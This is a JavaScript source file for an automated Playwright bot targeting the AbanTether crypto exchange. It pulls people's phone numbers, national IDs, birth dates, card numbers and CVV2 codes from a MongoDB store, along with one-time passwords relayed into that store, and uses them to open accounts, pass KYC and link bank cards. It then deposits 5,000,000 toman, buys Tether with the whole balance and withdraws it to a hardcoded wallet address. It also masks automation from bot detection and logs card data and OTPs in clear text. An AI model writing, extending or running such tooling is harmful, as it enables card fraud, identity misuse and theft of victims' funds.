const { MongoClient } = require('mongodb');
const { chromium } = require('playwright');
const fs = require('fs').promises;
const path = require('path');
require('dotenv').config();

class AbanTetherBot {
    constructor() {
        this.client = new MongoClient(process.env.MONGODB_URI);
        this.db = null;
        this.collection = null;
        this.browser = null;
        this.page = null;
        this.currentUser = null;
        this.processingUsers = new Set();
        this.screenshotsDir = './screenshots';
        this.password = 'Aban@1404T';
    }

    async log(step, message) {
        const timestamp = new Date().toISOString();
        const logMessage = `[${timestamp}] [${step}] ${message}`;
        console.log(logMessage);
    }

    async saveScreenshot(name) {
        try {
            await fs.mkdir(this.screenshotsDir, { recursive: true });
            const filepath = path.join(this.screenshotsDir, `${name}-${Date.now()}.png`);
            await this.page.screenshot({ path: filepath, fullPage: true });
        } catch (error) {
            this.log('ERROR', `Screenshot error: ${error.message}`);
        }
    }

    async connectToMongoDB() {
        try {
            await this.client.connect();
            this.db = this.client.db(process.env.DATABASE_NAME);
            this.collection = this.db.collection(process.env.COLLECTION_NAME);
            this.log('DATABASE', '✅ Connected to MongoDB');
        } catch (error) {
            this.log('ERROR', `Database connection failed: ${error.message}`);
            throw error;
        }
    }

    async checkDatabase() {
        try {
            this.log('DATABASE', '🔍 Checking for pending users...');
            
            const users = await this.collection.find({
                processed: { $ne: true },
                personalPhoneNumber: { $ne: "", $exists: true }
            }).toArray();

            this.log('DATABASE', `Found ${users.length} users with phone numbers`);

            for (const user of users) {
                const phone = user.personalPhoneNumber;
                
                if (phone && !this.processingUsers.has(phone)) {
                    this.log('PROCESSING', `🚀 Starting processing for: ${phone}`);
                    this.processingUsers.add(phone);
                    
                    this.processUser(user).catch(async (error) => {
                        this.log('ERROR', `Failed for ${phone}: ${error.message}`);
                        this.processingUsers.delete(phone);
                        await this.updateUserStatus(phone, 'failed', error.message);
                    });
                }
            }
        } catch (error) {
            this.log('ERROR', `Database check error: ${error.message}`);
        }
    }

    async processUser(user) {
        const phone = user.personalPhoneNumber;
        
        try {
            this.log('PROCESS', `🔄 Processing user: ${phone}`);
            await this.updateUserStatus(phone, 'starting', 'Process started');
            
            // Step 1: Initialize browser
            await this.updateUserStatus(phone, 'initializing_browser', 'Launching browser');
            await this.initializeBrowser();
            
            // Step 2: Enter phone number and wait for OTP
            await this.updateUserStatus(phone, 'entering_phone', 'Entering phone number');
            await this.enterPhoneNumber(user);
            
            await this.updateUserStatus(phone, 'waiting_login_otp', 'Waiting for login OTP');
            const loginOTP = await this.waitForField(phone, 'otp_login');
            
            // Step 3: Login with OTP
            await this.updateUserStatus(phone, 'logging_in', 'Logging in with OTP');
            await this.loginWithOTP(loginOTP);
            
            // Step 4: Handle password page (might be login or set password)
            await this.updateUserStatus(phone, 'handling_password', 'Handling password page');
            await this.handlePasswordPage();
            
            // Step 5: Complete basic KYC
            await this.updateUserStatus(phone, 'completing_basic_kyc', 'Completing basic KYC');
            await this.completeBasicKYC(user);
            
            // Step 6: Register bank card
            await this.updateUserStatus(phone, 'adding_card', 'Adding bank card');
            await this.addCard(user);
            
            await this.updateUserStatus(phone, 'waiting_card_otp', 'Waiting for card OTP');
            const cardOTP = await this.waitForField(phone, 'otp_register_card');
            
            await this.updateUserStatus(phone, 'registering_card', 'Registering card with OTP');
            await this.registerCardWithOTP(cardOTP);
            
            // Step 7: Deposit money
            await this.updateUserStatus(phone, 'initiating_payment', 'Initiating payment');
            await this.initiatePayment();
            
            await this.updateUserStatus(phone, 'waiting_payment_otp', 'Waiting for payment OTP');
            const paymentOTP = await this.waitForField(phone, 'otp_payment');
            
            await this.updateUserStatus(phone, 'completing_payment', 'Completing payment');
            await this.completePayment(paymentOTP);
            
            // Step 8: Buy Tether
            await this.updateUserStatus(phone, 'buying_tether', 'Buying Tether');
            await this.buyTether();
            
            // Step 9: Withdraw Tether
            await this.updateUserStatus(phone, 'withdrawing', 'Withdrawing Tether');
            await this.withdrawTether();
            
            // Complete
            await this.updateUserStatus(phone, 'completed', 'Process completed successfully');
            await this.markAsCompleted(phone);
            
            this.log('SUCCESS', `✅ Successfully completed for: ${phone}`);
            
        } catch (error) {
            this.log('ERROR', `❌ Process failed for ${phone}: ${error.message}`);
            await this.updateUserStatus(phone, 'failed', error.message);
            throw error;
        } finally {
            this.processingUsers.delete(phone);
            await this.closeBrowser();
        }
    }

    async waitForField(phone, fieldName, timeout = 300000) {
        this.log('WAIT', `⏳ Waiting for ${fieldName}...`);
        
        const startTime = Date.now();
        
        while (Date.now() - startTime < timeout) {
            try {
                const user = await this.collection.findOne({ personalPhoneNumber: phone });
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    const otp = user[fieldName];
                    this.log('WAIT', `✅ ${fieldName} received: ${otp}`);
                    
                    await this.collection.updateOne(
                        { personalPhoneNumber: phone },
                        { $unset: { [fieldName]: "" } }
                    );
                    
                    return otp;
                }
                
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                if (elapsed % 30 === 0) {
                    this.log('WAIT', `⏳ [${elapsed}s] Still waiting for ${fieldName}...`);
                }
                
                await this.sleep(5000);
                
            } catch (error) {
                this.log('ERROR', `Error checking ${fieldName}: ${error.message}`);
                await this.sleep(5000);
            }
        }
        
        throw new Error(`Timeout: No ${fieldName} received after ${timeout/1000} seconds`);
    }

    async initializeBrowser() {
        try {
            this.log('BROWSER', '🚀 Initializing browser...');
            
            this.browser = await chromium.launch({
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--window-size=1280,720'
                ]
            });
            
            const context = await this.browser.newContext({
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                viewport: { width: 1280, height: 720 },
                locale: 'fa-IR'
            });
            
            await context.addInitScript(() => {
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
            });
            
            this.page = await context.newPage();
            
            this.log('BROWSER', '✅ Browser initialized');
            
        } catch (error) {
            this.log('ERROR', `Browser init failed: ${error.message}`);
            throw error;
        }
    }

    async enterPhoneNumber(user) {
        try {
            this.log('PHONE', `📱 Entering phone: ${user.personalPhoneNumber}`);
            
            await this.page.goto('https://abantether.com/register', {
                waitUntil: 'networkidle',
                timeout: 30000
            });
            
            await this.saveScreenshot('01-register-page');
            
            // Enter phone number
            const phoneInput = await this.page.$('input[name="username"]');
            if (phoneInput) {
                await phoneInput.fill(user.personalPhoneNumber);
                this.log('PHONE', `✅ Phone entered: ${user.personalPhoneNumber}`);
            }
            
            await this.saveScreenshot('02-phone-filled');
            
            // Click continue button
            const continueButton = await this.page.$('button:has-text("ادامه")');
            if (continueButton) {
                await continueButton.click();
                this.log('PHONE', '✅ Continue button clicked');
            } else {
                await this.page.keyboard.press('Enter');
                this.log('PHONE', '✅ Pressed Enter');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('03-after-continue');
            
        } catch (error) {
            this.log('ERROR', `Phone entry failed: ${error.message}`);
            await this.saveScreenshot('error-phone');
            throw error;
        }
    }

    async loginWithOTP(otp) {
        try {
            this.log('LOGIN', `🔑 Logging in with OTP: ${otp}`);
            
            // Enter OTP
            const otpInput = await this.page.$('input[type="number"]');
            if (otpInput) {
                await otpInput.fill(otp);
                this.log('LOGIN', `✅ OTP entered: ${otp}`);
            }
            
            await this.saveScreenshot('04-otp-entered');
            
            // Click تأیید button
            const confirmButton = await this.page.$('button:has-text("تایید")');
            if (confirmButton) {
                await confirmButton.click();
                this.log('LOGIN', '✅ Confirm button clicked');
            } else {
                await this.page.keyboard.press('Enter');
                this.log('LOGIN', '✅ Pressed Enter');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('05-after-login');
            
        } catch (error) {
            this.log('ERROR', `Login failed: ${error.message}`);
            await this.saveScreenshot('error-login');
            throw error;
        }
    }

    async handlePasswordPage() {
        try {
            this.log('PASSWORD', '🔐 Handling password page...');
            
            await this.sleep(3000);
            await this.saveScreenshot('06-password-page');
            
            // Check what type of password page we're on
            const pageContent = await this.page.content();
            this.log('PASSWORD', `Page content check: ${pageContent.substring(0, 200)}...`);
            
            // Check if it's a login password page (1 field) or set password page (2 fields)
            const passwordInputs = await this.page.$$('input[type="password"]');
            this.log('PASSWORD', `Found ${passwordInputs.length} password inputs`);
            
            if (passwordInputs.length === 1) {
                // Probably login password page - try common passwords
                this.log('PASSWORD', '⚠️ Only 1 password field - trying login...');
                
                // Try the default password
                await passwordInputs[0].fill(this.password);
                this.log('PASSWORD', `✅ Password entered: ${this.password}`);
                
                // Look for login button
                const loginButton = await this.page.$('button:has-text("ورود")');
                if (loginButton) {
                    await loginButton.click();
                    this.log('PASSWORD', '✅ Login button clicked');
                } else {
                    await this.page.keyboard.press('Enter');
                    this.log('PASSWORD', '✅ Pressed Enter');
                }
                
            } else if (passwordInputs.length >= 2) {
                // Set password page
                this.log('PASSWORD', '✅ Set password page detected');
                
                // Enter password
                await passwordInputs[0].fill(this.password);
                this.log('PASSWORD', `✅ Password entered: ${this.password}`);
                
                // Confirm password
                await passwordInputs[1].fill(this.password);
                this.log('PASSWORD', '✅ Confirm password entered');
                
                // Click submit button
                const submitButton = await this.page.$('button:has-text("تکمیل ثبت‌نام")');
                if (submitButton) {
                    await submitButton.click();
                    this.log('PASSWORD', '✅ Registration completed');
                } else {
                    await this.page.keyboard.press('Enter');
                    this.log('PASSWORD', '✅ Pressed Enter');
                }
            } else {
                this.log('PASSWORD', '⚠️ No password fields found - might have skipped password step');
                return;
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('07-after-password');
            
        } catch (error) {
            this.log('ERROR', `Password handling failed: ${error.message}`);
            await this.saveScreenshot('error-password');
            throw error;
        }
    }

    async completeBasicKYC(user) {
        try {
            this.log('KYC', '📋 Completing basic KYC...');
            
            // Check current URL - might need to navigate to KYC page
            const currentUrl = await this.page.url();
            this.log('KYC', `Current URL: ${currentUrl}`);
            
            if (!currentUrl.includes('kyc') && !currentUrl.includes('profile')) {
                // Try to go to KYC page
                await this.page.goto('https://abantether.com/user/kyc/basic', {
                    waitUntil: 'networkidle',
                    timeout: 30000
                });
            }
            
            await this.sleep(3000);
            await this.saveScreenshot('08-kyc-page');
            
            // Fill KYC form
            if (user.personalNationalCode) {
                const nationalCodeInput = await this.page.$('input[placeholder*="کد ملی"]');
                if (nationalCodeInput) {
                    await nationalCodeInput.fill(user.personalNationalCode);
                    this.log('KYC', `✅ National code entered: ${user.personalNationalCode}`);
                }
            }
            
            if (user.personalBirthDate) {
                const birthDateInput = await this.page.$('input[placeholder*="تاریخ تولد"]');
                if (birthDateInput) {
                    await birthDateInput.fill(user.personalBirthDate);
                    this.log('KYC', `✅ Birth date entered: ${user.personalBirthDate}`);
                }
            }
            
            await this.saveScreenshot('09-kyc-filled');
            
            // Submit KYC
            const submitButton = await this.page.$('button:has-text("تایید اطلاعات")');
            if (submitButton) {
                await submitButton.click();
                this.log('KYC', '✅ KYC submitted');
            } else {
                await this.page.keyboard.press('Enter');
                this.log('KYC', '✅ Pressed Enter');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('10-kyc-completed');
            
        } catch (error) {
            this.log('ERROR', `KYC failed: ${error.message}`);
            await this.saveScreenshot('error-kyc');
            throw error;
        }
    }

    async addCard(user) {
        try {
            this.log('CARD', '💳 Adding bank card...');
            
            // Go to wallet page
            await this.page.goto('https://abantether.com/wallet', {
                waitUntil: 'networkidle',
                timeout: 30000
            });
            
            await this.saveScreenshot('11-wallet-page');
            
            // Look for add card button
            const addCardButton = await this.page.$('button:has-text("اضافه کردن کارت")');
            if (addCardButton) {
                await addCardButton.click();
                this.log('CARD', '✅ Add card button clicked');
                await this.sleep(2000);
            }
            
            await this.saveScreenshot('12-add-card-form');
            
            // Fill card information
            if (user.cardNumber) {
                const cardNumberInput = await this.page.$('input[placeholder*="شماره کارت"]');
                if (cardNumberInput) {
                    await cardNumberInput.fill(user.cardNumber);
                    this.log('CARD', `✅ Card number entered: ${user.cardNumber}`);
                }
            }
            
            if (user.cvv2) {
                const cvvInput = await this.page.$('input[placeholder*="CVV2"]');
                if (cvvInput) {
                    await cvvInput.fill(user.cvv2);
                    this.log('CARD', `✅ CVV2 entered: ${user.cvv2}`);
                }
            }
            
            if (user.bankMonth) {
                const monthInput = await this.page.$('input[placeholder*="ماه"]');
                if (monthInput) {
                    await monthInput.fill(user.bankMonth.toString());
                    this.log('CARD', `✅ Month entered: ${user.bankMonth}`);
                }
            }
            
            if (user.bankYear) {
                const yearInput = await this.page.$('input[placeholder*="سال"]');
                if (yearInput) {
                    await yearInput.fill(user.bankYear.toString());
                    this.log('CARD', `✅ Year entered: ${user.bankYear}`);
                }
            }
            
            await this.saveScreenshot('13-card-filled');
            
            // Submit card
            const submitButton = await this.page.$('button:has-text("ثبت کارت")');
            if (submitButton) {
                await submitButton.click();
                this.log('CARD', '✅ Card submitted');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('14-card-submitted');
            
        } catch (error) {
            this.log('ERROR', `Add card failed: ${error.message}`);
            await this.saveScreenshot('error-add-card');
            throw error;
        }
    }

    async registerCardWithOTP(otp) {
        try {
            this.log('CARD_OTP', `🔐 Registering card with OTP: ${otp}`);
            
            // Enter OTP
            const otpInput = await this.page.$('input[type="number"]');
            if (otpInput) {
                await otpInput.fill(otp);
                this.log('CARD_OTP', `✅ Card OTP entered: ${otp}`);
            }
            
            await this.saveScreenshot('15-card-otp-entered');
            
            // Confirm
            const confirmButton = await this.page.$('button:has-text("تایید")');
            if (confirmButton) {
                await confirmButton.click();
                this.log('CARD_OTP', '✅ Card confirmed');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('16-card-registered');
            
        } catch (error) {
            this.log('ERROR', `Card registration failed: ${error.message}`);
            await this.saveScreenshot('error-card-otp');
            throw error;
        }
    }

    async initiatePayment() {
        try {
            this.log('PAYMENT', '💰 Initiating payment...');
            
            // Go to deposit page
            await this.page.goto('https://abantether.com/deposit', {
                waitUntil: 'networkidle',
                timeout: 30000
            });
            
            await this.saveScreenshot('17-deposit-page');
            
            // Enter amount
            const amountInput = await this.page.$('input[placeholder*="مبلغ"]');
            if (amountInput) {
                await amountInput.fill('5000000');
                this.log('PAYMENT', '✅ Amount entered: 5,000,000 تومان');
            }
            
            await this.saveScreenshot('18-amount-filled');
            
            // Click واریز button
            const depositButton = await this.page.$('button:has-text("واریز")');
            if (depositButton) {
                await depositButton.click();
                this.log('PAYMENT', '✅ Payment initiated');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('19-payment-initiated');
            
        } catch (error) {
            this.log('ERROR', `Payment initiation failed: ${error.message}`);
            await this.saveScreenshot('error-payment-init');
            throw error;
        }
    }

    async completePayment(otp) {
        try {
            this.log('PAYMENT_OTP', `💳 Completing payment with OTP: ${otp}`);
            
            // Enter OTP
            const otpInput = await this.page.$('input[type="number"]');
            if (otpInput) {
                await otpInput.fill(otp);
                this.log('PAYMENT_OTP', `✅ Payment OTP entered: ${otp}`);
            }
            
            await this.saveScreenshot('20-payment-otp-entered');
            
            // Confirm payment
            const confirmButton = await this.page.$('button:has-text("تایید")');
            if (confirmButton) {
                await confirmButton.click();
                this.log('PAYMENT_OTP', '✅ Payment confirmed');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('21-payment-completed');
            
        } catch (error) {
            this.log('ERROR', `Payment completion failed: ${error.message}`);
            await this.saveScreenshot('error-payment-complete');
            throw error;
        }
    }

    async buyTether() {
        try {
            this.log('BUY', '🛒 Buying Tether...');
            
            // Go to market page
            await this.page.goto('https://abantether.com/market', {
                waitUntil: 'networkidle',
                timeout: 30000
            });
            
            await this.saveScreenshot('22-market-page');
            
            // Click خرید تتر button
            const buyButton = await this.page.$('button:has-text("خرید تتر")');
            if (buyButton) {
                await buyButton.click();
                this.log('BUY', '✅ Buy Tether clicked');
                await this.sleep(2000);
            }
            
            await this.saveScreenshot('23-buy-form');
            
            // Select همه موجودی
            const allBalanceButton = await this.page.$('button:has-text("همه موجودی")');
            if (allBalanceButton) {
                await allBalanceButton.click();
                this.log('BUY', '✅ All balance selected');
            }
            
            // Confirm purchase
            const confirmButton = await this.page.$('button:has-text("خرید")');
            if (confirmButton) {
                await confirmButton.click();
                this.log('BUY', '✅ Purchase confirmed');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('24-buy-completed');
            
        } catch (error) {
            this.log('ERROR', `Buy Tether failed: ${error.message}`);
            await this.saveScreenshot('error-buy');
            throw error;
        }
    }

    async withdrawTether() {
        try {
            this.log('WITHDRAW', '🏦 Withdrawing Tether...');
            
            // Go to withdraw page
            await this.page.goto('https://abantether.com/withdraw', {
                waitUntil: 'networkidle',
                timeout: 30000
            });
            
            await this.saveScreenshot('25-withdraw-page');
            
            // Enter withdraw address
            const addressInput = await this.page.$('input[placeholder*="آدرس"]');
            if (addressInput) {
                const withdrawAddress = 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS';
                await addressInput.fill(withdrawAddress);
                this.log('WITHDRAW', `✅ Address entered: ${withdrawAddress}`);
            }
            
            await this.saveScreenshot('26-address-filled');
            
            // Click برداشت button
            const withdrawButton = await this.page.$('button:has-text("برداشت")');
            if (withdrawButton) {
                await withdrawButton.click();
                this.log('WITHDRAW', '✅ Withdraw initiated');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('27-withdraw-completed');
            
        } catch (error) {
            this.log('ERROR', `Withdraw failed: ${error.message}`);
            await this.saveScreenshot('error-withdraw');
            throw error;
        }
    }

    async updateUserStatus(phone, status, message) {
        try {
            const updateData = {
                status: status,
                statusMessage: message,
                lastUpdated: new Date()
            };
            
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { $set: updateData }
            );
            
            this.log('STATUS', `📊 ${phone}: ${status} - ${message}`);
            
        } catch (error) {
            this.log('ERROR', `Status update failed: ${error.message}`);
        }
    }

    async markAsCompleted(phone) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: { 
                        processed: true,
                        status: "completed",
                        completedAt: new Date()
                    }
                }
            );
            
            this.log('COMPLETE', `✅ Marked ${phone} as completed`);
            
        } catch (error) {
            this.log('ERROR', `Mark as completed failed: ${error.message}`);
        }
    }

    async closeBrowser() {
        try {
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
                this.log('BROWSER', '✅ Browser closed');
            }
        } catch (error) {
            this.log('ERROR', `Browser close failed: ${error.message}`);
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async startPolling() {
        this.log('POLLING', '🔄 Starting database polling (every 30 seconds)');
        
        await this.checkDatabase();
        
        setInterval(async () => {
            try {
                await this.checkDatabase();
            } catch (error) {
                this.log('ERROR', `Polling error: ${error.message}`);
            }
        }, 30000);
        
        // Health check server
        const http = require('http');
        const server = http.createServer((req, res) => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                status: 'running',
                timestamp: new Date().toISOString(),
                processing: Array.from(this.processingUsers)
            }));
        });
        
        server.listen(8080, () => {
            this.log('SERVER', '🌐 Health check server running on port 8080');
        });
    }

    async start() {
        this.log('START', '🤖 AbanTether Bot Starting...');
        
        try {
            await this.connectToMongoDB();
            await this.startPolling();
        } catch (error) {
            this.log('ERROR', `Start failed: ${error.message}`);
            setTimeout(() => this.start(), 10000);
        }
    }
}

// اجرای ربات
const bot = new AbanTetherBot();
bot.start();

// هندل خطاها
process.on('unhandledRejection', (error) => {
    console.error('[UNHANDLED]', error);
});

process.on('uncaughtException', (error) => {
    console.error('[UNCAUGHT]', error);
});